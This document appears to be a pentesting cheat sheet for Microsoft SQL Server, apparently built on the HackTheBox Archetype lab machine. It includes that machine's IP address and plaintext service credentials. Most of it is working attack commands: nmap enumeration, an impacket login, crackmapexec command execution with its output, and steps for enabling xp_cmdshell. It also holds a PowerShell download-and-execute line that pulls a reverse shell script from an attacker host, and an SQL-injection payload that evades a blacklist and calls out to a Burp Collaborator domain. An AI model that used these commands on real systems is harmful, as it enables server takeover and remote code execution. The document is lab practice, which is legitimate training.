# MSSQL Pentesting

### Default Information
```
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
```

## Enumeration

### Automatic Enumeration

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.203.147
```

### Impacket-mssqlclient.py

login
```
mssqlclient.py Archetype/sql_svc:M3g4c0rp123@10.129.203.147 -windows-auth
```

### Execute OS Command

cme
```
$ cme mssql 10.129.203.147 -u sql_svc -p 'M3g4c0rp123' -x 'whoami'
MSSQL       10.129.203.147  1433   ARCHETYPE        [*] Windows 10.0 Build 17763 (name:ARCHETYPE) (domain:Archetype)
MSSQL       10.129.203.147  1433   ARCHETYPE        [+] Archetype\sql_svc:M3g4c0rp123 (Pwn3d!)
MSSQL       10.129.203.147  1433   ARCHETYPE        [+] Executed command via mssqlexec
MSSQL       10.129.203.147  1433   ARCHETYPE        --------------------------------------------------------------------------------
MSSQL       10.129.203.147  1433   ARCHETYPE        archetype\sql_svc
```

xp_cmdshell
```
Use master
EXEC sp_helprotect 'xp_cmdshell'
# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE

#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
